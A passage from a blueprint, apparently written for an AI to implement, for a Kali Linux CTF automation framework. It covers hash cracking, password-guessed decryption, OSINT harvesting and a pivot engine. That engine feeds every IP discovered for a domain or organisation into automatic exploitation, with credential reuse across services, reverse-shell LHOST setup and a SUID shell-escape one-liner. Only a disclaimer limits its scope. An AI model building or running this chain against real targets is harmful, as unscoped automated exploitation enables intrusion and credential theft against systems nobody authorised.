If result is still encoded: recurse up to 5 levels deep.

BASE64:
  Condition: matches ^[A-Za-z0-9+/=]+$ and length > 8
  Run: echo "<RAW_CONTENT>" | base64 -d 2>/dev/null
  If decode succeeds and output is printable:
    Print: [+] Base64 decoded: <result>
    Update RAW_CONTENT = decoded result. Re-check encoding.

HEX:
  Condition: matches ^[0-9a-fA-F\s]+$ and even character count
  Run: echo "<RAW_CONTENT>" | xxd -r -p 2>/dev/null
  If output is printable:
    Print: [+] Hex decoded: <result>

BINARY:
  Condition: contains only 0, 1, and whitespace characters
  Run inline python3:
    b = RAW_CONTENT.replace(" ","").replace("\n","")
    result = "".join(chr(int(b[i:i+8],2))
              for i in range(0,len(b),8))
  Print: [+] Binary decoded: <result>

ROT13:
  Condition: content is all printable ASCII
  Run: echo "<RAW_CONTENT>" | tr 'A-Za-z' 'N-ZA-Mn-za-m'
  Print: [+] ROT13: <result>
  Run flag_scan() on result.

CAESAR (all 25 shifts):
  Condition: content is all printable ASCII
  Run inline python3 to try all 25 shifts.
  Select shift that produces most dictionary words.
  Print: [+] Caesar shift <n>: <result>

XOR:
  Condition: xortool in PATH
  Run: xortool <FILE_PATH> 2>/dev/null
  Parse: extract likely key length and key value
  Run: xortool-xor -r <key> -f <FILE_PATH>
                   > /tmp/xor_out.bin 2>/dev/null
  Run: strings /tmp/xor_out.bin
  Run flag_scan() on strings output.

──────────────────────────────────────────
STEP 3 — HASH CRACKING:
──────────────────────────────────────────

CONDITION: hash type was identified in Step 1.

HASH MODE MAP (select automatically based on hashid output):
  MD5      → hashcat mode 0
  SHA1     → hashcat mode 100
  SHA256   → hashcat mode 1400
  SHA512   → hashcat mode 1700
  bcrypt   → hashcat mode 3200
  NTLM     → hashcat mode 1000
  MySQL4   → hashcat mode 300

Run john first:
  Run: john <FILE_PATH>
            --wordlist=/usr/share/wordlists/rockyou.txt
  Parse: if plaintext found → print and store.
  Print: [+] John cracked: <plaintext>

If john fails or reports unsupported format:
  Run: hashcat -a 0 -m <mode>
               <FILE_PATH>
               /usr/share/wordlists/rockyou.txt --quiet
  Parse: extract cracked value from output.
  Print: [+] Hashcat cracked: <plaintext>

If both fail:
  Print: [-] Hash not cracked with rockyou.txt

──────────────────────────────────────────
STEP 4 — OPENSSL DECRYPTION ATTEMPTS:
──────────────────────────────────────────

CONDITION: file appears binary or encrypted
           (non-printable characters detected)

Try in order with these passwords:
  "", "password", "admin", "secret", "ctf", "flag", "key"

For each password:
  Run: openssl enc -d -aes-256-cbc
                   -in <FILE_PATH>
                   -pass pass:"<password>" 2>/dev/null
  If output is printable text:
    Print: [+] OpenSSL decrypted with: "<password>"
    Run flag_scan() on decrypted output.
    Stop trying more passwords.

──────────────────────────────────────────
STEP 5 — NETWORK CRYPTO CHALLENGE:
──────────────────────────────────────────

PURPOSE: Some CTF crypto challenges require connecting to
a remote server port, receiving encoded or encrypted data,
solving it, sending the answer back, and receiving a flag.
This step handles that automatically.

Prompt: "Is this a network crypto challenge? [y/N]:"
If N or Enter: skip this step.

If Y:
  Prompt: "Enter server IP:"
  Prompt: "Enter server port:"

  STEP A — CONNECT AND CAPTURE:
  Connect: nc <server_ip> <server_port>
  Capture all received data to /tmp/crypto_challenge.txt
  Print: [*] Connected to <server_ip>:<server_port>
  Run flag_scan() on received data immediately.

  STEP B — DETECT AND DECODE:
  Apply encoding detection from Step 2 to received data.
  If data decoded to plaintext: run flag_scan() on it.

  STEP C — AUTO-SOLVE SCRIPT:
  Generate python3 script at /tmp/<toolname>_crypto_solver.py:

    import socket, base64, re

    FLAG_PATTERNS = <FLAG_PATTERNS from session>
    s = socket.socket()
    s.connect(("<server_ip>", <server_port>))
    s.settimeout(10)
    full_output = ""

    while True:
        try:
            data = s.recv(4096).decode(errors="ignore")
            if not data:
                break
            full_output += data
            print("[received]", data.strip())

            for p in FLAG_PATTERNS:
                match = re.search(p, data)
                if match:
                    print("[+] FLAG FOUND:", match.group())

            # Try base64 decode on received line
            stripped = data.strip()
            try:
                decoded = base64.b64decode(stripped).decode()
                print("[+] Decoded:", decoded)
                s.send((decoded + "\n").encode())
            except Exception:
                pass

        except socket.timeout:
            break

    print("[*] Full output saved.")
    with open("/tmp/crypto_challenge.txt","w") as f:
        f.write(full_output)

  Run: python3 /tmp/<toolname>_crypto_solver.py
  Monitor output for flag pattern matches.
  Print: [+] FLAG RECEIVED FROM SERVER: <flag>

Run flag_scan() on ALL output from this module.

==============================================================
SECTION 10: OSINT MODULE
==============================================================

TRIGGER: Category = 5.
INPUT: domain, username, or organization name as TARGET.

──────────────────────────────────────────
STEP 1 — WHOIS:
  Run: whois <TARGET>
  Parse: extract registrant, email, org, nameservers, dates
  Print: [+] Whois: <key> = <value>

STEP 2 — DNS ENUMERATION:
  Run: dnsenum <TARGET> 2>/dev/null
  Parse: extract A, MX, NS, TXT records and subdomains
  Store discovered IPs in OSINT_IPS[]
  Print: [+] DNS: <type> → <value>

STEP 3 — EMAIL AND ASSET HARVESTING:
  Run: theHarvester -d <TARGET> -b all -l 200 2>/dev/null
  Parse: extract emails, subdomains, IPs, hostnames
  Store: EMAILS[], SUBDOMAINS[], HOSTS[]
  Print each category.

STEP 4 — SUBDOMAIN BRUTE FORCE:
  Run: gobuster dns -d <TARGET>
                    -w /usr/share/wordlists/dirb/common.txt
                    -q 2>/dev/null
  Parse: extract valid subdomains.
  Print: [+] Subdomain: <value>

STEP 5 — PIVOT ON DISCOVERED IPS:
  For each IP in OSINT_IPS[]:
    Call Pivot Engine on that IP.
    Route to PWN module automatically.

Run flag_scan() on ALL collected OSINT output.

==============================================================
SECTION 11: PIVOT ENGINE
==============================================================

TRIGGER: Category = 7, or called mid-session when new
         data type is encountered.
INPUT: any string (IP, file path, or extracted data)

DETECTION RULES (check in this exact order):

RULE 1 — IP ADDRESS:
  If input matches ^\d{1,3}(\.\d{1,3}){3}$:
    Run ping -c 1 <input>
    If alive: Print [*] PIVOT: IP detected → routing to PWN
    Route to PWN module (Section 5).
    If web port found during scan: also run Web module.

RULE 2 — FILE PATH:
  If input is a valid file path and file exists:
    Run: file <input>
    Parse file type string:
      Contains "ELF" or "executable":
        Print: [*] PIVOT: ELF detected → Reverse Engineering
        Route to Reverse module (Section 7).
      Contains "image" or "JPEG" or "PNG" or "GIF":
        Print: [*] PIVOT: Image detected → Forensics
        Route to Forensics module (Section 8).
      Contains "Zip" or "archive" or "gzip" or "bzip2":
        Print: [*] PIVOT: Archive detected → Forensics
        Route to Forensics module (Section 8).
      Contains "pcap" or "tcpdump":
        Print: [*] PIVOT: PCAP detected → Forensics
        Route to Forensics module (Section 8).
      Contains "ASCII text" or "data":
        Run: strings <input> | head -20
        If base64 pattern detected:
          Print: [*] PIVOT: Encoded data → Crypto
          Route to Crypto module (Section 9).
        If hash pattern detected:
          Print: [*] PIVOT: Hash detected → Crypto
          Route to Crypto module (Section 9).
        Else:
          Print: [*] PIVOT: Text file → Forensics
          Route to Forensics module (Section 8).

RULE 3 — EXTRACTED FILE (mid-session):
  Called automatically when binwalk or foremost extracts
  a file during Forensics module.
  Apply same detection logic as Rule 2 to extracted file.
  Print: [*] PIVOT: Extracted <type> → routing to <module>

RULE 4 — SHELL ACCESS (mid-session):
  Called when SSH login confirmed or Meterpreter opened.
  Print: [*] PIVOT: Shell access detected → Post-Exploitation
  Route to Post-Exploitation module (Section 6).

RULE 5 — ENCODED STRING:
  Called when any tool output contains a long string.
  Check against patterns:
    ^[A-Za-z0-9+/=]{20,}$ → try base64 decode
    ^[0-9a-fA-F\s]{20,}$  → try hex decode
    ^[01\s]{20,}$          → try binary decode
  If any decode produces printable output:
    Run flag_scan() on decoded result.
    Print: [+] Auto-decoded: <value>

Every routing decision is logged:
  Print: [*] PIVOT: <input type> → <module name>

==============================================================
SECTION 12: GLOBAL RULES AND SHARED FUNCTIONS
==============================================================

All functions below live in common.py.
Every module imports and uses these. Never duplicated.

──────────────────────────────────────────
FUNCTION: print_status(type, message)
──────────────────────────────────────────

All terminal output goes through this function only.
Raw tool output is never printed directly.

  type = "success"  → print: [+] <message>  color: green
  type = "info"     → print: [*] <message>  color: cyan
  type = "warning"  → print: [!] <message>  color: red
  type = "negative" → print: [-] <message>  color: yellow
  type = "error"    → print: [ERROR] <message> then sys.exit(1)

Use the rich library for colors and formatting.

──────────────────────────────────────────
FUNCTION: run_tool(command, timeout_seconds)
──────────────────────────────────────────

Runs any system command as a subprocess.
Returns stdout as a string, or "" on failure.

Logic:
  Use subprocess.run() with capture_output=True, text=True.
  Set timeout=timeout_seconds.
  If FileNotFoundError: tool not installed.
    Log to session file: "SKIPPED: <tool>"
    Return "".
  If TimeoutExpired:
    Kill process.
    call print_status("info", "<tool> timed out")
    Return whatever stdout was captured.
  If returncode != 0 and stdout is empty:
    Return "".
  If returncode != 0 but stdout has content:
    Return stdout (partial results are useful).
  Always write full stdout + stderr to session log file:
    /tmp/<toolname>_<target>_<timestamp>/<toolname>_out.txt

TIMEOUT VALUES (use these exactly):
  nmap fast/deep scan:    300 seconds
  nmap full -p- scan:     600 seconds
  gobuster/ffuf/ferox:    180 seconds
  hydra:                  240 seconds
  nikto:                  120 seconds
  nuclei:                 120 seconds
  sqlmap:                 120 seconds
  metasploit module:      180 seconds
  all other tools:        60 seconds

──────────────────────────────────────────
FUNCTION: flag_scan(text)
──────────────────────────────────────────

Called after every single tool execution.
Input: stdout string from any tool.

Logic:
  For each pattern in FLAG_PATTERNS[]:
    Run re.findall(pattern, text)
    For each match:
      If match not already in FOUND_FLAGS[]:
        Append to FOUND_FLAGS[]
        Call print_status("warning", "FLAG FOUND: " + match)
  Return list of new matches found.

This function is never skipped.
It is called on every string of tool output,
every decoded string, every file content read.

──────────────────────────────────────────
FUNCTION: store_cred(username, password, source_tool)
──────────────────────────────────────────

Appends to CREDENTIALS[] as dict:
  {user: username, pass: password, source: source_tool}

Calls: print_status("success",
  "Credential found: " + username + ":" + password +
  " via " + source_tool)

After storing: immediately triggers credential reuse
check against all currently known open services.

──────────────────────────────────────────
FUNCTION: store_hash(hash_value)
──────────────────────────────────────────

Runs hashid on hash_value to detect type.
Appends to HASHES[]: {value, type, cracked: None}

Immediately queues cracking:
  Try john with rockyou.txt.
  If john fails: try hashcat with correct mode.
  If cracked: update HASHES[] entry with plaintext.
  Call print_status("success", "Hash cracked: " + plaintext)

──────────────────────────────────────────
FUNCTION: detect_local_ip()
──────────────────────────────────────────

Run: ip route get 1 2>/dev/null | awk '{print $7; exit}'
If result is valid IP: store as LOCAL_IP. Return it.
If command fails:
  Prompt user: "Enter your local IP (for reverse shells):"
  Store response as LOCAL_IP. Return it.

LOCAL_IP is used in:
  All Metasploit LHOST values
  All msfvenom LHOST values
  Reverse shell payload generation

──────────────────────────────────────────
FUNCTION: dependency_check(tool_list)
──────────────────────────────────────────

For each tool in tool_list:
  Use shutil.which(tool) to check availability.
  If None: add to MISSING_TOOLS[]
  Else: add to AVAILABLE_TOOLS[]

Returns dict: {tool: True/False}
Called once at startup before any user input.

──────────────────────────────────────────
FUNCTION: fetch_cve(service, version)
──────────────────────────────────────────

Only called from Web and PWN modules.
Never called from Reverse, Forensics, Crypto, OSINT.

Builds query: service + " " + version
Fetches NVD API. Parses JSON. Returns CVE list.
Falls back to searchsploit if internet unavailable.
Returns list of dicts: [{id, score, description}]

──────────────────────────────────────────
SESSION LOGGING RULES:
──────────────────────────────────────────

On startup: create directory:
  /tmp/<toolname>_<target>_<timestamp>/

Every tool execution writes its full output to:
  /tmp/<toolname>_<target>_<timestamp>/<toolname>_out.txt

All session data (CREDENTIALS, HASHES, FLAGS, CVEs)
written to:
  /tmp/<toolname>_<target>_<timestamp>/session_data.json

This JSON file is updated after every new finding.
It is used by the report generator at the end.

==============================================================
SECTION 13: REPORT GENERATION
==============================================================

TRIGGER: After all phases of selected module complete.
Generated by module_report.py using session_data.json.

Output file:
  <toolname>_report_<target>_<YYYYMMDD_HHMMSS>.txt

Saved to current working directory where tool was launched.

Report content:

  ══════════════════════════════════════════════════
  <TOOLNAME> — CTF AUTOMATION REPORT
  ══════════════════════════════════════════════════
  Target         : <target>
  Category       : <selected category>
  Attack Mode    : <Stealth / Normal / Aggressive>
  Date / Time    : <timestamp>
  Flag Format    : <pattern(s) used>
  Local IP       : <LOCAL_IP>
  ══════════════════════════════════════════════════

  [HOST SUMMARY]
  Status    : Alive / Unreachable
  OS Guess  : <from nmap or "Unknown">
  Hostname  : <if detected>

  [OPEN PORTS AND SERVICES]
  <port>/tcp   <service>   <version>
  (one line per port)

  [CVE MATCHES]
  Port <port> — <service> <version>:
    <CVE-ID> | CVSS: <score> | <description>
    Metasploit: <module path or "not found">
    Searchsploit: <exploit title> → <path>
  (repeat for each port with CVEs)

  [DIRECTORIES AND ENDPOINTS FOUND]
  <path>  (Status: <code>)
  (one per line, sorted by status code)

  [VULNERABILITY FINDINGS]
  [Nikto]
  <finding line>
  [Nuclei]
  <severity> — <template> — <url>
  [SQLi]
  Parameter: <name> | Database: <type> | DBs: <list>
  [XSS]
  Parameter: <name> at <path>

  [CREDENTIALS FOUND]
  <user>:<pass>   (Source: <tool>)

  [HASHES]
  <hash>   Type: <type>   Cracked: <plaintext or UNCRACKED>

  [SHELL ACCESS]
  Type      : <Meterpreter / SSH / None>
  User      : <whoami output>
  Privilege : <root / user / unknown>

  [POST-EXPLOITATION FINDINGS]
  <LinPEAS high-value findings>
  <pspy root process findings>
  <files found: user.txt, root.txt, flag files>

  [FLAGS FOUND]
  <each matched flag string — one per line>

  [METADATA AND OSINT FINDINGS]
  <key>: <value>

  [MISSING TOOLS]
  <comma-separated list of tools not installed>
  (or "None" if all tools present)

  [SUGGESTED NEXT STEPS]
  Based on all findings, print actionable recommendations.
  Examples:
    "CVE-2021-41773 confirmed on port 80 —
     run Metasploit module: exploit/multi/http/apache_normalize_path"
    "Credentials admin:password123 found —
     try on SSH, SMB, and web login panel"
    "SUID binary /usr/bin/find detected —
     run: find . -exec /bin/sh \; -quit"
    "Hash cracked: admin:letmein —
     try this on all login panels"

  ══════════════════════════════════════════════════
  END OF REPORT
  ══════════════════════════════════════════════════

After saving report:
  Print compact terminal summary:
    [+] Open ports: <list>
    [+] Credentials: <list>
    [+] Flags found: <list>
    [+] Report saved: <filename>

==============================================================
SECTION 14: INSTALLATION SYSTEM
==============================================================

──────────────────────────────────────────
FILE: install.sh
──────────────────────────────────────────

#!/bin/bash

TOOL_NAME="<toolname>"
INSTALL_DIR="/opt/$TOOL_NAME"
BIN_PATH="/usr/local/bin/$TOOL_NAME"

# STEP 1 — CHECK ROOT
if [ "$EUID" -ne 0 ]; then
  echo "[!] Please run as root: sudo bash install.sh"
  exit 1
fi

echo "[*] Installing $TOOL_NAME..."

# STEP 2 — INSTALL PYTHON DEPENDENCIES
echo "[*] Installing Python dependencies..."
pip3 install rich requests --break-system-packages
if [ $? -ne 0 ]; then
  echo "[!] pip3 failed. Install pip3 and retry."
  exit 1
fi

# STEP 3 — CREATE TOOL DIRECTORY
echo "[*] Copying files to $INSTALL_DIR..."
mkdir -p "$INSTALL_DIR"
cp main.py common.py module_web.py module_pwn.py \
   module_reverse.py module_forensics.py \
   module_crypto.py module_osint.py \
   module_pivot.py module_postexploit.py \
   module_report.py README.md "$INSTALL_DIR/"

# STEP 4 — CREATE LAUNCHER
echo "[*] Creating launcher at $BIN_PATH..."
cat > "$BIN_PATH" << EOF
#!/bin/bash
python3 /opt/$TOOL_NAME/main.py "\$@"
EOF
chmod +x "$BIN_PATH"

# STEP 5 — VERIFY
if which "$TOOL_NAME" > /dev/null 2>&1; then
  echo "[+] Installation successful."
  echo "[+] Run the tool by typing: $TOOL_NAME"
else
  echo "[!] Installation may have failed. Check manually."
fi

──────────────────────────────────────────
FILE: uninstall.sh
──────────────────────────────────────────

#!/bin/bash

TOOL_NAME="<toolname>"

if [ "$EUID" -ne 0 ]; then
  echo "[!] Please run as root: sudo bash uninstall.sh"
  exit 1
fi

rm -f "/usr/local/bin/$TOOL_NAME"
rm -rf "/opt/$TOOL_NAME"
echo "[+] $TOOL_NAME removed from system."

==============================================================
SECTION 15: PROJECT FILE STRUCTURE
==============================================================

<toolname>/
├── main.py               ← entry point, banner, input flow
├── common.py             ← all shared functions
├── module_web.py         ← Section 4
├── module_pwn.py         ← Section 5
├── module_postexploit.py ← Section 6
├── module_reverse.py     ← Section 7
├── module_forensics.py   ← Section 8
├── module_crypto.py      ← Section 9
├── module_osint.py       ← Section 10
├── module_pivot.py       ← Section 11
├── module_report.py      ← Section 13
├── install.sh            ← Section 14
├── uninstall.sh          ← Section 14
└── README.md             ← Section 16

==============================================================
SECTION 16: README.md
==============================================================

# <TOOLNAME>
> Full-Cycle CTF Automation Framework for Kali Linux

<TOOLNAME> is a logic-driven CLI tool that automates the
entire recon-to-report pipeline for CTF competitions.
It chains pre-installed Kali Linux tools together based
on discovered results — no AI, no guessing, pure logic.

---

## Features

- Automated recon, enumeration, and exploitation chaining
- Six CTF categories: Web, PWN, Reverse, Forensics, OSINT, Crypto
- Auto-pivot engine that detects input types and routes automatically
- CVE lookup against NVD database for every discovered service version
- Metasploit automation with auto-generated resource scripts
- Post-exploitation with LinPEAS and pspy integration
- Flag detection with regex scanning after every single tool run
- Structured report generated at the end of every session
- Runs like a native Kali Linux tool after one-command installation

---

## Requirements

- Kali Linux 2023 or later
- Python 3.10 or later
- Root or sudo access for installation
- Internet connection for CVE lookup (optional — tool works offline)

---

## Installation
```bash
git clone https://github.com/<your-username>/<toolname>
cd <toolname>
sudo bash install.sh
```

Run from anywhere after install:
```bash
<toolname>
```

---

## Uninstall
```bash
sudo bash uninstall.sh
```

---

## Usage
```bash
<toolname>
```

Follow the prompts:

[?] Select category (1-7)
[?] Enter target IP or file path
[?] Enter flag prefix  e.g. THM{  or  HTB{
[?] Select attack mode (1-3)


The tool runs automatically from there.

---

## Categories

| # | Category           | Input        |
|---|--------------------|--------------|
| 1 | Web Exploitation   | IP address   |
| 2 | Network / Full PWN | IP address   |
| 3 | Reverse Engineering| File path    |
| 4 | Digital Forensics  | File path    |
| 5 | OSINT              | Domain/name  |
| 6 | Cryptography       | File path    |
| 7 | Auto-Detect        | IP or file   |

---

## Output

Live findings printed in terminal during execution.
Full report saved after every session:

<toolname>report<target>_<timestamp>.txt


Raw tool logs saved to:

/tmp/<toolname><target><timestamp>/


---

## Tools Used

**Recon:** nmap, ping, curl, wget

**Web:** ffuf, gobuster, feroxbuster, dirsearch, dirb,
nikto, nuclei, whatweb, wafw00f, sqlmap, dalfox, wfuzz

**PWN:** nmap, msfconsole, msfvenom, searchsploit,
hydra, netcat, ssh, ftp, smbclient, enum4linux,
rpcclient, linpeas, pspy

**Reverse:** strings, file, ltrace, strace, gdb,
radare2, ghidra, objdump, readelf

**Forensics:** binwalk, exiftool, foremost,
bulk_extractor, volatility3, stegseek, zsteg, steghide

**Crypto:** base64, xortool, john, hashcat,
hashid, openssl, python3

**OSINT:** theHarvester, dnsenum, whois, gobuster

---

## Report Contents

- Target summary and OS detection
- All open ports with service versions
- CVE matches with CVSS scores
- Discovered web directories and endpoints
- Vulnerability findings from Nikto, Nuclei, sqlmap, dalfox
- All credentials found across all tools
- Hashes found and cracked values
- Shell access details and privilege level
- Post-exploitation findings from LinPEAS and pspy
- Every flag found during the session
- Actionable next steps based on findings

---

## Disclaimer

This tool is intended for use in legal CTF competitions
and authorized penetration testing environments only.
Examples of appropriate use: HackTheBox, TryHackMe,
PicoCTF, CTFtime.org events, and lab environments you own.

Do not use this tool against systems you do not own or
have explicit written permission to test.
The author is not responsible for any misuse.

---

## License

MIT License. See LICENSE file for details.

==============================================================
ARCHITECTURE NOTE FOR THE AI BUILDING THIS TOOL
==============================================================

Language: Python 3

Required libraries (install via pip3):
  rich      — terminal colors, spinners, tables, panels
  requests  — HTTP calls to NVD CVE API

Standard library modules to use:
  subprocess — run all system tools via run_tool()
  re         — regex for flag detection and output parsing
  os         — file and path operations
  sys        — exit codes and arguments
  json       — parse NVD API and searchsploit JSON output
  socket     — crypto challenge port connections
  time       — timestamps and sleep
  shutil     — shutil.which() for dependency checking

Build order (do this one file at a time):
  1. common.py           — build all shared functions first
  2. main.py             — banner, input flow, dispatcher
  3. module_pivot.py     — routing engine
  4. module_web.py       — web module
  5. module_pwn.py       — pwn module
  6. module_postexploit.py
  7. module_reverse.py
  8. module_forensics.py
  9. module_crypto.py
  10. module_osint.py
  11. module_report.py
  12. install.sh + uninstall.sh

Rules the AI must follow when writing code:
  Every tool call uses run_tool() from common.py.
  Every output line uses print_status() from common.py.
  flag_scan() is called on every tool's stdout immediately.
  No raw tool output ever goes directly to the terminal.
  Every if/else branch described in each section is handled.
  Missing tools are silently skipped via MISSING_TOOLS check.
  Timeout values from Section 12 are used exactly as listed.
  All stored data (creds, hashes, flags) use the functions
  in common.py — never stored directly in module files.

==============================================================
END OF FULL <TOOLNAME> BLUEPRINT
==============================================================